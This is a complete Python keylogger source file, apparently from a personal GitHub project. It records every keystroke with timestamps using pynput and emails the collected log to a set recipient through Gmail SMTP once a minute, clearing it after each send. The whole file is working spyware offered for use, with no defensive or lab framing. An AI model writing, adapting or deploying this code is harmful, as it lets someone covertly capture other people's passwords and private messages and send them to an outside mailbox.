# Simple Python Keylogger
# Author: Kelly McGucken
# January 3, 2025
# with help from other GitHub projects 

from pynput.keyboard import Key, Listener
import os
import time
import threading
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Set to your credentials in .env 
EMAIL_ADDRESS = os.getenv('EMAIL')  
EMAIL_PASSWORD = os.getenv('APP_PASSWORD')

# Choose the recipient to send logs to 
# Note that it does not need to be a Gmail address
RECIPIENT = 'youremail@example.com' 
SUBJECT = 'Log Report'

# Log file to store keystrokes
log = "Keystrokes incoming..."

# Sends the captured keystrokes to specified recipient address
def send_email():
    global log

    # Create the email message
    message = MIMEMultipart()
    message['From'] = EMAIL_ADDRESS # Send from your specified address 
    message['To'] = RECIPIENT
    message['Subject'] = SUBJECT

    # Add body to email
    message.attach(MIMEText(log, 'plain'))

    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(EMAIL_ADDRESS, EMAIL_PASSWORD)  
        server.send_message(message)
        server.quit()
        log = ""  # Clear log after sending

    except Exception as e:
        print(f"Error sending email: {e}")

# Records keystrokes into the log variable.
def on_press(key):
    global log

    # Generate timestamp 
    timestamp = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())

    try:

        if hasattr(key, 'char'): 
            key = str(key.char)
            log += f"{timestamp}: {key} \n"  # Alphanumeric keys
        else:
            raise AttributeError

    except AttributeError:

        # Record backspaces in log (not handled gracefully)
        if key == Key.backspace:
            log += f"{timestamp}: [{key}] \n"
        elif key == Key.space or Key.enter or Key.tab:
            log += f"{timestamp}: \n"  # Handle spaces, tabs, and returns 
        else: 
            log += f"{timestamp}: [{key}] \n"  # Catch other special keys

# Stops the listener if ESC is pressed.
def on_release(key):
    if key == Key.esc:
        return False

# Sends an email every n seconds, preceded by an initial email
# once the keylogger is started.
def email_timer():
    threading.Timer(60, email_timer).start()
    send_email() 

if __name__ == "__main__":
    # Start the email timer
    email_timer()

    # Set up the listener with both callbacks
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

